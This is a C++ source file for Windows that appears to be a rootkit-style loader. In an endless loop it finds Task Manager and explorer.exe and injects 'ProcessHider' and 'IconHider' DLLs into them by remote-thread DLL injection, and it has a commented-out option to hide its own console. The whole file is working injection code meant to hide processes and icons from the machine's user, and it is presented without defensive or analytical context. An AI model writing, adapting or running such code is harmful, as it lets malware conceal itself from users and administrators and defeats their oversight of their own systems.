#include <Windows.h>
#include <TlHelp32.h>

//only for input output
#include <iostream>
#include <string>
#include <stdio.h>

using namespace std;

bool inject_dll(DWORD pid, string dll_path)
{
	//gets a handle to the process by the process pid
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE)
	{
		cout << " [-]Failed to get handle of the process" << endl;
		return false;
	}
	cout << " [+] Got handle of the process" << endl;

	//allocating more memmory in the process memmory space and getting the address to the new memmory allocation 
	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (address == NULL)
	{
		cout << " [-] VirtualAllocEx Failed" << endl;
		return false;
	}
	cout << " [+] VirtualAllocEx Succeeded" << endl;

	//writing the dll into the new memmory space
	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res)
	{
		cout << " [-] WriteProcessMemory Failed" << endl;
		return false;
	}
	cout << " [+] WriteProcessMemory Succeeded" << endl;

	//executing the dll as a thread
	HANDLE remoteThread = CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL);
	if (remoteThread == INVALID_HANDLE_VALUE)
	{
		cout << " [-] CreateRemoteThread Failed" << endl;
		return false;
	}
	cout << " [+] CreateRemoteThread Succeeded" << endl;

	//closing the handle of the process 
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	DWORD lastipid = 4;
	DWORD lastppid = 4;

	string iconp(dll_path_c);
	string processp(dll_path_c);
	size_t index = iconp.find_last_of('\\');
	iconp.erase(iconp.begin() + index, iconp.end());
	processp.erase(processp.begin() + index, processp.end());
	iconp.append("\\IconHider.dll");
	processp.append("\\ProcessHider.dll");

	while (true)
	{
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE)
		{
			cout << " [-] CreateToolhelp32Snapshot Failed" << endl;
		}

		if (!Process32First(proc_snap, &process))
		{
			cout << " [-] Process32First Failed" << endl;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastppid != process.th32ProcessID)
			{
				cout << " [+] Found TaskManager!!!" << endl;
				if (!inject_dll(process.th32ProcessID, processp))
				{
					cout << " [-] Failed Injecting TaskManager" << endl;
				}
				lastppid = process.th32ProcessID;
			}

			if (!lstrcmp(process.szExeFile, L"explorer.exe") && lastipid != process.th32ProcessID)
			{
				cout << " [+] Found explorer!!!" << endl;
				if (!inject_dll(process.th32ProcessID, iconp))
				{
					cout << " [-] Failed Injecting explorer" << endl;
				}
				lastipid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
	}
}

int main()
{
	string inp;

	//hide the console:
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	cout << "Enter \"q\" to Quit or Keep this running to inject into future task manager processes" << endl << endl;

	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)find_and_inject, NULL, NULL, NULL);

	while (true) {
		cin >> inp;
		if (inp == "q") {
			ExitProcess(0);
		}
	}
	return 0;
}